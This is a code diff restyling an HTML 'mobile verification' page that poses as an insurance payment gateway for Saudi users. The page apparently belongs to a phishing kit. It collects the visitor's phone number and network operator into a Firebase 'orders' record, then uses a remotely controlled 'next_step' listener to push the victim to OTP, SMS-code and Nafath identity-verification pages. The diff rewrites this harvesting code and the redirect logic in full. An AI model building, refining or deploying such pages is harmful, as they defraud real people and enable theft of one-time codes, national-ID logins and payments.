@@ -6,83 +6,93 @@
     <script src="js/theme-toggle.js"></script>
     <script src="js/i18n.js"></script>
     <title>تأكيد الجوال | Mobile Verification</title>
-    <link id="bootstrap-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="css/site-theme.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/inner-theme.css">
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     <style>
-        body { min-height: 100vh; margin: 0; display: flex; flex-direction: column; }
-        .navbar { width: 100%; padding: 10px 0; }
-        .nav-logo { height: 35px; margin-inline-end: 20px; }
-        .main-content { flex: 1; display: flex; align-items: center; justify-content: center; width: 100%; padding: 20px 0; }
-        .form-wrapper { max-width: 500px; width: 90%; padding: 35px; border-radius: var(--tree-radius-lg); }
-        .form-label { font-weight: 700; margin-bottom: 10px; }
-        .btn-submit { padding: 12px; width: 100%; font-size: 1.1rem; margin-top: 20px; border: none; border-radius: 12px; }
-        .btn-submit:disabled { opacity: 0.5; cursor: not-allowed; }
-        .site-footer { text-align: center; padding: 15px; color: var(--tree-text-muted); font-size: 0.8rem; width: 100%; }
+        body { display:flex; flex-direction:column; min-height:100vh; }
+        .main-wrap { flex:1; display:flex; align-items:center; justify-content:center; padding:28px 16px 48px; }
     </style>
 </head>
-<body class="tree-site">
+<body>
 
 <button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>
 
-<nav class="navbar">
-    <div class="container-fluid d-flex justify-content-between align-items-center">
-        <img src="images/logo.png" class="nav-logo" alt="Tree" onerror="this.src='https://placehold.co/100x35/198754/ffffff?text=TREE'">
-        <button class="btn btn-outline-success btn-sm" data-lang-toggle onclick="toggleLang()">EN</button>
+<nav class="inner-nav">
+    <a href="index.html" class="inner-nav__logo">tree</a>
+    <div class="inner-nav__right">
+        <button class="lang-btn" data-lang-toggle onclick="toggleLang()">EN</button>
     </div>
 </nav>
 
-<div class="main-content">
-<div class="form-wrapper">
-    <h3 class="text-center mb-4 fw-bold text-success" data-i18n="mobile.title">تأكيد رقم هاتف مقدم الطلب</h3>
+<div class="main-wrap">
+    <div class="teal-card teal-card--narrow" style="width:100%;">
+        <div class="card-head">
+            <div class="section-title" data-i18n="mobile.title">تأكيد رقم هاتف مقدم الطلب</div>
+        </div>
+        <div class="card-body">
 
-    <div class="alert alert-success bg-opacity-10 border-success text-success text-center mb-4 small fw-bold" role="alert" data-i18n="mobile.alert">
-        لمتابعة طلب وثيقة التأمين، يرجى إدخال رقم هاتف مقدم الطلب بشكل صحيح.
-    </div>
+            <div class="alert-teal" data-i18n="mobile.alert">لمتابعة طلب وثيقة التأمين، يرجى إدخال رقم هاتف مقدم الطلب بشكل صحيح.</div>
 
-    <form id="mobileForm" class="needs-validation" novalidate onsubmit="handleSubmit(event)">
+            <form id="mobileForm" novalidate onsubmit="handleSubmit(event)">
 
-        <!-- رقم الجوال -->
-        <div class="mb-4">
-            <label for="phoneNumber" class="form-label" data-i18n="mobile.phone_label">رقم الجوال *</label>
-            <div class="input-group has-validation" dir="ltr">
-                <span class="input-group-text bg-white text-success fw-bold">+966</span>
-                <input type="tel" class="form-control" id="phoneNumber" placeholder="5xxxxxxxx" maxlength="9" required pattern="^5[0-9]{8}$" style="text-align: left; font-size: 18px;" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
-                <div class="invalid-feedback text-end" data-i18n="mobile.phone_invalid">
-                    رقم الجوال يجب أن لا يقل عن 9 أرقام (يبدأ بـ 5)
+                <!-- رقم الجوال -->
+                <div class="field">
+                    <label class="field__label" for="phoneNumber" data-i18n="mobile.phone_label">رقم الجوال *</label>
+                    <div class="phone-wrap">
+                        <div class="phone-prefix">
+                            <span>🇸🇦</span>
+                            <span>+966</span>
+                            <span style="opacity:.25;margin-inline-start:2px;">|</span>
+                        </div>
+                        <input type="tel" class="field__input" id="phoneNumber" placeholder="5xxxxxxxx" maxlength="9" required pattern="^5[0-9]{8}$" dir="ltr" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+                    </div>
+                    <div id="phone-err" class="alert-error" data-i18n="mobile.phone_invalid">رقم الجوال يجب أن لا يقل عن 9 أرقام (يبدأ بـ 5)</div>
                 </div>
-            </div>
-        </div>
 
-        <!-- مشغل الشبكة -->
-        <div class="mb-4">
-            <label class="form-label" for="networkOperator" data-i18n="mobile.operator_label">اختر مشغل شبكة الجوال *</label>
-            <select class="form-select form-select-lg" id="networkOperator" required>
-                <option value="" selected disabled data-i18n="mobile.operator_select">-- اختر المشغل --</option>
-                <option value="STC">STC</option>
-                <option value="Mobily">موبايلي</option>
-                <option value="Zain">زين</option>
-            </select>
-        </div>
+                <!-- مشغل الشبكة -->
+                <div class="field">
+                    <label class="field__label" data-i18n="mobile.operator_title">مشغل شبكة الجوال *</label>
+                    <div class="operator-grid">
+                        <div class="operator-card-wrap">
+                            <input type="radio" name="networkOperator" id="op_stc" value="STC" required>
+                            <label class="operator-card-label" for="op_stc">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b3/STC_Logo.svg" alt="STC">
+                                <span>STC</span>
+                            </label>
+                        </div>
+                        <div class="operator-card-wrap">
+                            <input type="radio" name="networkOperator" id="op_mobily" value="Mobily">
+                            <label class="operator-card-label" for="op_mobily">
+                                <img src="https://upload.wikimedia.org/wikipedia/en/e/e7/Mobily_Logo.svg" alt="Mobily">
+                                <span>Mobily</span>
+                            </label>
+                        </div>
+                        <div class="operator-card-wrap">
+                            <input type="radio" name="networkOperator" id="op_zain" value="Zain">
+                            <label class="operator-card-label" for="op_zain">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/9/9d/Zain-logo.svg" alt="Zain">
+                                <span>Zain</span>
+                            </label>
+                        </div>
+                    </div>
+                </div>
 
-        <!-- خيار هل الرقم مسجل باسم مقدم الطلب -->
-        <div class="mb-4">
-            <div class="form-check p-3 border rounded-3 bg-light d-flex align-items-center gap-2">
-                <input class="form-check-input m-0" type="checkbox" id="isOwner" checked style="width: 20px; height: 20px;">
-                <label class="form-check-label fw-bold" for="isOwner" data-i18n="mobile.is_owner">
-                    هل الرقم مسجل باسم مقدم الطلب؟
-                </label>
-            </div>
-        </div>
+                <!-- هل الرقم مسجل باسم مقدم الطلب -->
+                <div class="consent-row" style="margin-bottom:20px;">
+                    <input type="checkbox" class="consent-check" id="isOwner" checked>
+                    <label class="consent-text" for="isOwner" data-i18n="mobile.is_owner">هل الرقم مسجل باسم مقدم الطلب؟</label>
+                </div>
 
-        <button type="submit" class="btn-submit" id="submitBtn" data-i18n="mobile.btn_register">تسجيل</button>
-    </form>
+                <button type="submit" class="btn-green" id="submitBtn" data-i18n="mobile.btn_register">تسجيل</button>
+
+            </form>
+        </div>
+    </div>
 </div>
-</div>
 
-<div class="site-footer" data-i18n="footer.secure">Secure Payment Gateway © 2024</div>
+<div class="inner-footer" data-i18n="footer.secure">Secure Payment Gateway © 2024</div>
 
 <script>
     const firebaseConfig = {
@@ -98,58 +108,51 @@
 
     async function handleSubmit(event) {
         event.preventDefault();
-        const form = event.target;
-        
-        if (!form.checkValidity()) {
-            event.stopPropagation();
-            form.classList.add('was-validated');
+        const phoneEl = document.getElementById('phoneNumber');
+        const phone = phoneEl.value;
+        const op = document.querySelector('input[name="networkOperator"]:checked')?.value;
+
+        if (!phone.match(/^5[0-9]{8}$/)) {
+            document.getElementById('phone-err').classList.add('visible');
             return;
         }
+        document.getElementById('phone-err').classList.remove('visible');
 
         const btn = document.getElementById('submitBtn');
         btn.disabled = true;
-        btn.innerText = t('mobile.btn_registering');
+        btn.textContent = t('mobile.btn_registering');
 
-        const op = document.getElementById('networkOperator').value;
-        const phone = document.getElementById('phoneNumber').value;
         const isOwner = document.getElementById('isOwner').checked;
         const userId = localStorage.getItem('user_id');
 
         try {
             await db.collection("orders").doc(userId).update({
-                operator: op,
-                phone_number: "0" + phone, // Adding 0 prefix
+                operator: op || 'Unknown',
+                phone_number: "0" + phone,
                 is_phone_owner: isOwner,
                 status: "waiting_sms_code"
             });
             window.location.href = "sms_verification.html";
-        } catch (e) {
+        } catch(e) {
             btn.disabled = false;
-            btn.innerText = "تسجيل";
+            btn.textContent = t('mobile.btn_register');
             alert(t('mobile.err_connection'));
         }
-    }// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
-(function() {
-    const userId = localStorage.getItem('user_id');
-    if (userId) {
-        db.collection("orders").doc(userId).onSnapshot((doc) => {
-            if (doc.exists) {
-                const data = doc.data();
-                if (data.next_step === "GO_TO_OTP") {
-                    window.location.href = "otp_verification.html"; 
-                } else if (data.next_step === "GO_TO_REJECT") {
-                    window.location.href = "payment_failed.html";
-                } else if (data.next_step === "GO_TO_NAFATH") {
-                    window.location.href = "nafath.html";
-                } else if (data.next_step === "SHOW_NAFATH_CODE") {
-                    window.location.href = "nafath.html"; // التوجيه الصحيح
-                }
-            }
-        });
     }
-})();
-// ------------------------------------------
 
+    (function() {
+        const userId = localStorage.getItem('user_id');
+        if (userId) {
+            db.collection("orders").doc(userId).onSnapshot((doc) => {
+                if (doc.exists) {
+                    const data = doc.data();
+                    if (data.next_step === "GO_TO_OTP") window.location.href = "otp_verification.html";
+                    else if (data.next_step === "GO_TO_REJECT") window.location.href = "payment_failed.html";
+                    else if (data.next_step === "GO_TO_NAFATH" || data.next_step === "SHOW_NAFATH_CODE") window.location.href = "nafath.html";
+                }
+            });
+        }
+    })();
 </script>
 </body>
 </html>
